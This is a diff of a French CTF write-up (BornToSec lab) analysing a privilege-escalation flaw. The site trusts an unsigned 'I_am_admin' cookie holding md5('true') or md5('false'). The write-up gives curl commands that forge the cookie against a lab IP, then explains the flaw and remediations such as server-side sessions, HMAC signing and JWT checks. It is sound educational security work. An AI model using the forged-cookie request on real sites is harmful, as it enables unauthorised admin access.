@@ -1,86 +1,139 @@
-# Analyse de la faille — CTF BornToSec (cookie `I_am_admin`)
+# Analyse de vulnérabilité — Cookie d’élévation de privilèges (`I_am_admin`)
 
-**Contexte**  
-CTF autorisé — cible : `http://192.168.64.3/index.php?page=redirect&site=http://example.com`.  
-Le test montre qu'un cookie nommé `I_am_admin` contient une valeur MD5 correspondant au statut d'admin (`false` ou `true`). En modifiant ce cookie côté client (ou via requête HTTP) on obtient l'accès à la fonctionnalité d'administration et la flag.
+## Contexte
+CTF autorisé — cible :  
+`http://192.168.64.3/index.php?page=redirect&site=http://example.com`
 
----
-
-## 1) Comment on a trouvé la faille (reproduction / démarche)
-1. **Observation initiale**  
-   Requête curl pour afficher les en-têtes `Set-Cookie` :
-   ```bash
-   curl -sI "http://192.168.64.3/index.php?page=redirect&site=http://example.com" | grep -i '^Set-Cookie:'
-   ```
-   On obtient :  
-   ```
-   Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; ...
-   ```
-   La valeur `68934a3e9455fa72420237eb05902327` correspond à `md5("false")`.
-
-2. **Hypothèse**  
-   Le site semble utiliser un flag « suis-je admin » stocké côté client sous forme d’un hash MD5 du texte `true`/`false`. Comme le serveur accepte ce cookie pour décider des droits, il est probable qu'en remplaçant la valeur par `md5("true")` on obtient les droits admin.
-
-3. **Test pratique (curl)**  
-   Remplacement du cookie par MD5("true") :
-   ```bash
-   curl -i -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
-   ```
-   Réponse : page HTML contenant la flag (extrait) :
-   ```
-   Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
-   ```
-   On a donc confirmé que la modification du cookie octroie les droits.
+L’analyse montre qu’un cookie nommé `I_am_admin` contient une valeur **MD5** correspondant au statut administrateur (`false` ou `true`).  
+En modifiant ce cookie côté client (navigateur ou requête HTTP), il est possible d’obtenir un accès administrateur et de récupérer la flag.
 
 ---
 
-## 2) Explication technique de la faille (pour le write-up)
-### Description succincte
-Le site stocke un indicateur d'autorisation (`I_am_admin`) côté client dans un cookie contenant **un MD5 du texte** `"true"` ou `"false"`. Le serveur fait confiance à ce cookie et autorise les actions administratives si la valeur correspond à `md5("true")`. Ce mécanisme est fondamentalement non sécurisé car le client peut modifier son cookie.
+## 1) Découverte et reproduction de la faille
 
-### Pourquoi c'est vulnérable
-- **Confiance dans les données client** : Tout cookie client est contrôlable par l'utilisateur. Stocker un flag de privilège côté client sans protection d'intégrité permet de le falsifier.  
-- **Absence d'authentification/integrité (clé secrète)** : Un simple hachage (MD5(payload)) sans clé secrète (HMAC) ne protège pas contre la falsification.  
-- **MD5 inadapté** : MD5 est obsolète pour l'intégrité et susceptible de collisions ; mais le problème majeur ici est l'absence de signature plutôt que la faiblesse du hash en elle-même.  
-- **Manque de vérification côté serveur** : Le serveur devrait vérifier l'identité/les droits à partir d'un stockage serveur de confiance (session, DB) au lieu d'interpréter un flag client.
+### Observation initiale
+Récupération des en-têtes HTTP afin d’identifier les cookies :
+```bash
+curl -sI "http://192.168.64.3/index.php?page=redirect&site=http://example.com" | grep -i '^Set-Cookie:'
+```
 
-### Impact
-- Escalade de privilèges locale : tout utilisateur peut devenir admin simplement en changeant un cookie.  
-- Exposition potentielle de données sensibles et opérations critiques (modification d'utilisateurs, accès à flags/ressources protégées).
+Résultat :
+```
+Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; ...
+```
+
+La valeur `68934a3e9455fa72420237eb05902327` correspond à `md5("false")`.
 
 ---
 
-## 3) Preuves / PoC (commandes utiles)
-### Commande curl (PoC simple)
+### Hypothèse
+Le serveur semble déterminer les privilèges administrateur à partir d’un cookie client, dont la valeur est simplement le hash MD5 du texte `"true"` ou `"false"`.  
+Si le serveur fait confiance à ce cookie sans vérification supplémentaire, remplacer la valeur par `md5("true")` devrait accorder les droits administrateur.
+
+---
+
+### Test pratique (preuve de concept)
+Remplacement du cookie par `md5("true")` :
+```bash
+curl -i -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
+```
+
+Réponse (extrait) :
+```
+Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
+```
+
+La modification du cookie permet donc bien une élévation de privilèges.
+
+---
+
+## 2) Explication technique de la vulnérabilité
+
+### Description synthétique
+Le site stocke un indicateur d’autorisation (`I_am_admin`) **côté client**, sous forme d’un hash MD5 de la chaîne `"true"` ou `"false"`.  
+Le serveur utilise directement cette valeur pour décider si l’utilisateur est administrateur.
+
+---
+
+### Pourquoi ce mécanisme est vulnérable
+- **Confiance excessive dans le client**  
+  Les cookies sont entièrement contrôlables par l’utilisateur. Tout contrôle d’accès fondé uniquement sur un cookie client est falsifiable.
+
+- **Absence d’intégrité cryptographique**  
+  Un simple hash (`MD5(payload)`) sans clé secrète n’assure aucune protection contre la modification.
+
+- **MD5 obsolète**  
+  MD5 n’est plus considéré sûr (collisions, rapidité excessive).  
+  Toutefois, le problème principal ici est surtout l’absence de signature, pas seulement l’algorithme utilisé.
+
+- **Mauvaise conception de l’authentification**  
+  Les droits doivent être évalués à partir d’une source serveur de confiance (session, base de données), pas d’un indicateur client.
+
+---
+
+## 3) Impact
+
+- **Élévation de privilèges** : tout utilisateur peut devenir administrateur.
+- **Compromission de la confidentialité et de l’intégrité** : accès à des fonctionnalités et données sensibles.
+- **Surface d’attaque critique** : possibilité de modification du système, d’autres comptes ou de données protégées.
+
+Sévérité : **élevée**, car l’attaque est triviale et ne nécessite aucune authentification préalable.
+
+---
+
+## 4) Preuve de concept (commande utile)
+
 ```bash
 curl -i -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
 ```
 
 ---
 
-## 4) Correctifs & bonnes pratiques
-### 4.1 Meilleure approche — sessions côté serveur (recommandé)
-- Ne stocker **aucun** droit d'accès directement côté client.
-- Stocker `user_id` et `roles` dans une session côté serveur (mémoire, Redis, base, etc.). Le cookie transmis au client ne contient que un `session_id` opaque.
-- Configurer le cookie de session : `HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age` raisonnable.
-- Vérifier à chaque requête les droits côté serveur avant d'autoriser l'action.
+## 5) Correctifs et bonnes pratiques
 
-### 4.2 Si stockage côté client nécessaire — signer le cookie
-- Utiliser une MAC (HMAC-SHA256) avec **une clé serveur secrète** :
-  - Stocker `payload` + `signature = HMAC(secret, payload)`.
-  - À la réception, recalculer la signature et refuser si elle ne correspond pas.
-- Exemple de format : `value = base64(payload) + "." + hex(hmac)`.
-- Ne jamais utiliser un simple hash sans clé (md5(payload) ne suffit pas).
-
-### 4.3 Utiliser JWT correctement (si stateless voulu)
-- JWT signé (HS256 ou mieux RS256) avec vérification de `iss`, `aud`, `exp`.  
-- Prévoir mécanisme de révocation / rotation si besoin (ou adopter un store central si révocation nécessaire).
-
-### 4.4 Durcissements additionnels
-- Attributs cookie : `HttpOnly`, `Secure`, `SameSite=Strict` (`Lax` si besoin compatibilité).  
-- Rotation régulière des clés secrètes et invalidation des sessions après rotation selon procédure.  
-- Logging et alerting sur tentatives de falsification (signatures invalides, cookies altérés).  
-- Revue de code & tests d'accès (unitaires + intégration) pour endpoints sensibles.  
-- Limiter l'exposition des informations dans les cookies (minimalisme).
+### 5.1 Solution recommandée — sessions côté serveur
+- Ne stocker **aucun droit d’accès** côté client.
+- Conserver l’identité utilisateur et les rôles **côté serveur** (session, base de données, Redis…).
+- Le cookie client ne doit contenir qu’un identifiant de session opaque.
+- Attributs recommandés pour le cookie :
+  - `HttpOnly`
+  - `Secure`
+  - `SameSite=Strict`
+  - durée de vie limitée
 
 ---
+
+### 5.2 Signature cryptographique si stockage client nécessaire
+- Utiliser une **MAC** (ex. `HMAC-SHA256`) avec une clé secrète serveur.
+- Format recommandé :
+  ```
+  value = base64(payload) + "." + hex(hmac(secret, payload))
+  ```
+- Rejeter toute requête dont la signature est invalide.
+- Ne jamais utiliser un hash simple (`md5(payload)`).
+
+---
+
+### 5.3 Utilisation correcte des JWT (si architecture stateless)
+- JWT signé (`HS256` ou `RS256`).
+- Vérification stricte de :
+  - `iss` (issuer)
+  - `aud` (audience)
+  - `exp` (expiration)
+- Prévoir un mécanisme de révocation ou une durée de vie courte.
+
+---
+
+### 5.4 Mesures de durcissement complémentaires
+- Journalisation des tentatives de falsification de cookies.
+- Alertes sur signatures invalides.
+- Rotation régulière des clés secrètes.
+- Tests automatisés des contrôles d’accès.
+- Principe de minimisation des données stockées côté client.
+
+---
+
+## Conclusion
+Cette faille illustre un cas classique d’**élévation de privilèges par confiance dans des données client**.  
+Même avec un hash, un cookie non signé et interprété côté serveur ne constitue pas un mécanisme de sécurité.  
+La seule approche fiable repose sur des contrôles d’accès côté serveur et des mécanismes d’authentification correctement conçus.
